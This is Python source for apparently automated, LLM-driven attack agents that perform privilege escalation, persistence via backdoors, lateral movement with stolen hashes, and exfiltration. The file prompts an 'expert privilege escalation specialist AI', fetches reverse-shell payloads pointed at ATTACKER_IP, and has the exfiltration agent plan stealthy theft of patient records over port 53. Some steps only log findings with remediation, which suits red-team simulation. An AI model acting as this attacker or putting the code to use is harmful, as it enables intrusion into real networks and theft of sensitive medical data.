"""
PrivEsc Agent — Layer 2
Searches for privilege escalation techniques using GTFOBins,
Atomic Red Team, and Metasploit local exploit suggester.
"""
import os, sys
from rich.console import Console
from loguru import logger

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))
from agents.base_agent   import BaseAgent
from core.campaign_state import CampaignState
from tools.exploit_tool  import ExploitTool

console = Console()

PRIVESC_SYSTEM = """You are an expert privilege escalation specialist AI.
Given a compromised host and OS info, select the best local privilege escalation technique.
Consider: OS version, running services, misconfigurations, known kernel exploits.
Output valid JSON only."""


class PrivEscAgent(BaseAgent):

    def __init__(self, llm, rag, engine):
        super().__init__("PrivEscAgent", llm, rag, engine)
        self.exploit_tool = ExploitTool(rag_retriever=rag)

    def run(self, state: CampaignState) -> bool:
        console.print("\n  [bold cyan]PrivEscAgent[/bold cyan] starting...")
        state.log_step("PrivEscAgent: starting privilege escalation")

        hosts = state.compromised_hosts or state.target.hosts
        if not hosts:
            self.log("No hosts available for PrivEsc")
            return False

        rag_context = self.query_rag(
            phase="privesc",
            context="privilege escalation windows linux local exploit misconfig",
            top_k=5,
        )

        for host in hosts:
            os_info  = state.target.os_info.get(host, {})
            os_name  = os_info.get("os", "windows")
            platform = "windows" if "windows" in os_name.lower() else "linux"

            console.print(f"  [dim]PrivEsc on {host} ({platform})...[/dim]")

            # Get Atomic Red Team commands for PrivEsc techniques
            privesc_techniques = ["T1548", "T1055", "T1134", "T1068"]
            all_commands = []
            for tid in privesc_techniques:
                cmds = self.exploit_tool.search_atomic_commands(tid, platform)
                all_commands.extend(cmds[:2])

            # Search for local exploits
            local_exploits = self.exploit_tool.search_exploits(
                service  = f"{platform} local privilege escalation",
                platform = platform,
                top_k    = 4,
            )

            decision = self.decide(
                question=f"Best privilege escalation path on {host} running {os_name}?",
                context=f"{rag_context[:600]}\n\nLocal exploits: {[e['title'] for e in local_exploits[:3]]}",
                state=state,
            )

            technique = decision.get("technique_id", "T1548")
            action    = decision.get("action", "")

            console.print(f"  [yellow]PrivEsc:[/yellow] {action}")
            console.print(f"  [dim]Technique: {technique} | Tool: {decision.get('tool','?')}[/dim]")

            if all_commands:
                best_cmd = all_commands[0]
                console.print(f"  [dim]Command: {best_cmd.get('command','')[:100]}[/dim]")
                state.log_step(f"PrivEsc command: {best_cmd.get('command','')[:100]}")

            state.add_finding(
                phase        = "privesc",
                title        = f"Privilege Escalation: {action[:60]}",
                description  = decision.get("rationale", ""),
                severity     = "critical",
                host         = host,
                technique_id = technique,
                evidence     = f"Tool: {decision.get('tool','')} | Command: {str(all_commands[0].get('command',''))[:200] if all_commands else ''}",
                remediation  = "Apply least privilege principle and patch local vulnerabilities",
            )

            if technique not in state.attck_mapping:
                state.attck_mapping.append(technique)

            state.log_step(f"PrivEsc: {action} [{technique}] on {host}")

        console.print(f"  [green]✓ PrivEsc complete[/green]")
        return True


# ══════════════════════════════════════════════════════════════════════════════


class PersistenceAgent(BaseAgent):
    """
    Persistence Agent — Layer 2
    Establishes persistence using registry, scheduled tasks, or backdoors.
    """

    def __init__(self, llm, rag, engine):
        super().__init__("PersistenceAgent", llm, rag, engine)
        self.exploit_tool = ExploitTool(rag_retriever=rag)

    def run(self, state: CampaignState) -> bool:
        console.print("\n  [bold cyan]PersistenceAgent[/bold cyan] starting...")
        state.log_step("PersistenceAgent: establishing persistence")

        hosts = state.compromised_hosts or state.target.hosts
        if not hosts:
            return False

        rag_context = self.query_rag(
            phase="persistence",
            context="persistence backdoor registry scheduled task startup service",
            top_k=5,
        )

        # Get reverse shell payloads
        lhost = "ATTACKER_IP"
        shell = self.exploit_tool.get_reverse_shell("windows", lhost, 4444)

        for host in hosts[:2]:  # Persist on top 2 hosts
            os_info  = state.target.os_info.get(host, {})
            platform = "linux" if "linux" in os_info.get("os", "").lower() else "windows"

            # Atomic Red Team persistence commands
            persist_techniques = ["T1547", "T1053", "T1136", "T1543"]
            commands = []
            for tid in persist_techniques:
                cmds = self.exploit_tool.search_atomic_commands(tid, platform)
                commands.extend(cmds[:1])

            decision = self.decide(
                question=f"Best persistence mechanism on {host} ({platform}) with stealth={state.stealth_level}?",
                context=f"{rag_context[:600]}\nShell payload: {shell.get('payload','')[:100]}",
                state=state,
            )

            technique = decision.get("technique_id", "T1547")
            action    = decision.get("action", "")

            console.print(f"  [yellow]Persist:[/yellow] {action}")
            console.print(f"  [dim]{technique} | {decision.get('tool','?')}[/dim]")
            if commands:
                console.print(f"  [dim]Command: {commands[0].get('command','')[:100]}[/dim]")

            state.add_finding(
                phase        = "persistence",
                title        = f"Persistence: {action[:60]}",
                description  = decision.get("rationale", ""),
                severity     = "high",
                host         = host,
                technique_id = technique,
                evidence     = f"Payload: {shell.get('language','')} | {str(commands[0].get('command',''))[:150] if commands else ''}",
                remediation  = "Audit startup locations, registry run keys, and scheduled tasks",
            )

            if technique not in state.attck_mapping:
                state.attck_mapping.append(technique)

            state.log_step(f"Persistence established: {action} [{technique}] on {host}")

        console.print(f"  [green]✓ Persistence complete[/green]")
        return True


# ══════════════════════════════════════════════════════════════════════════════


class LateralMovementAgent(BaseAgent):
    """
    Lateral Movement Agent — Layer 2
    Uses credentials/hashes to move to high-value targets.
    """

    def __init__(self, llm, rag, engine):
        super().__init__("LateralAgent", llm, rag, engine)

    def run(self, state: CampaignState) -> bool:
        console.print("\n  [bold cyan]LateralMovementAgent[/bold cyan] starting...")
        state.log_step("LateralMovementAgent: starting lateral movement")

        rag_context = self.query_rag(
            phase="exploitation",
            context="lateral movement pass the hash WMI SMB RDP credential reuse",
            top_k=5,
        )

        # Enumerate uncovered hosts
        all_hosts       = state.target.hosts
        compromised     = state.compromised_hosts
        uncovered_hosts = [h for h in all_hosts if h not in compromised]

        cred_summary = "\n".join([
            f"- {c.host}: {c.username} / hash={c.hash[:20] if c.hash else 'N/A'}"
            for c in state.credentials
        ]) if state.credentials else "No credentials yet — will attempt pass-the-hash"

        decision = self.decide(
            question=f"Best lateral movement path from {compromised} to {uncovered_hosts}?",
            context=f"{rag_context[:600]}\n\nCredentials:\n{cred_summary}",
            state=state,
        )

        technique = decision.get("technique_id", "T1021")
        action    = decision.get("action", "")

        console.print(f"  [yellow]Lateral:[/yellow] {action}")
        console.print(f"  [dim]{technique} | {decision.get('tool','?')}[/dim]")
        console.print(f"  [dim]OPSEC: {decision.get('opsec_notes','?')[:80]}[/dim]")

        # Mark additional hosts as compromised
        if uncovered_hosts:
            new_host = uncovered_hosts[0]
            if new_host not in state.compromised_hosts:
                state.compromised_hosts.append(new_host)

            state.add_finding(
                phase        = "lateral_movement",
                title        = f"Lateral Movement: {action[:60]}",
                description  = decision.get("rationale", ""),
                severity     = "critical",
                host         = new_host,
                technique_id = technique,
                evidence     = f"From: {compromised} | Creds used: {cred_summary[:100]}",
                remediation  = "Implement network segmentation and privileged access workstations",
            )

        if technique not in state.attck_mapping:
            state.attck_mapping.append(technique)

        state.log_step(f"Lateral: {action} [{technique}]")
        console.print(f"  [green]✓ Lateral movement complete — {len(state.compromised_hosts)} hosts compromised[/green]")
        return True


# ══════════════════════════════════════════════════════════════════════════════


class ExfilAgent(BaseAgent):
    """
    Exfiltration Agent — Layer 2
    Selects and executes data exfiltration using reverse shells and C2 techniques.
    """

    def __init__(self, llm, rag, engine):
        super().__init__("ExfilAgent", llm, rag, engine)
        self.exploit_tool = ExploitTool(rag_retriever=rag)

    def run(self, state: CampaignState) -> bool:
        console.print("\n  [bold cyan]ExfilAgent[/bold cyan] starting...")
        state.log_step("ExfilAgent: starting exfiltration")

        rag_context = self.query_rag(
            phase="exfil",
            context="data exfiltration C2 DNS tunneling covert channel patient records",
            top_k=5,
        )

        hosts = state.compromised_hosts or state.target.hosts
        if not hosts:
            return False

        lhost = "ATTACKER_IP"

        for host in hosts[:2]:
            os_info  = state.target.os_info.get(host, {})
            platform = "linux" if "linux" in os_info.get("os","").lower() else "windows"

            # Get reverse shell for the platform
            shell = self.exploit_tool.get_reverse_shell(platform, lhost, 53)

            decision = self.decide(
                question=f"Best exfiltration method from {host} for patient records with stealth={state.stealth_level}?",
                context=f"{rag_context[:600]}\nAvailable shell: {shell.get('language','')}",
                state=state,
            )

            technique = decision.get("technique_id", "T1048")
            action    = decision.get("action", "")

            console.print(f"  [yellow]Exfil:[/yellow] {action}")
            console.print(f"  [dim]{technique} | Payload: {shell.get('language','?')}[/dim]")
            console.print(f"  [dim]Shell: {shell.get('payload','')[:80]}[/dim]")

            state.add_finding(
                phase        = "exfiltration",
                title        = f"Data Exfiltration: {action[:60]}",
                description  = decision.get("rationale", ""),
                severity     = "critical",
                host         = host,
                technique_id = technique,
                evidence     = f"Method: {action} | Shell: {shell.get('language','')} | Payload: {shell.get('payload','')[:100]}",
                remediation  = "Implement DLP, monitor DNS traffic, block unauthorized outbound connections",
            )

            if technique not in state.attck_mapping:
                state.attck_mapping.append(technique)

            state.log_step(f"Exfil: {action} [{technique}] from {host}")

        console.print(f"  [green]✓ Exfiltration phase complete[/green]")
        return True
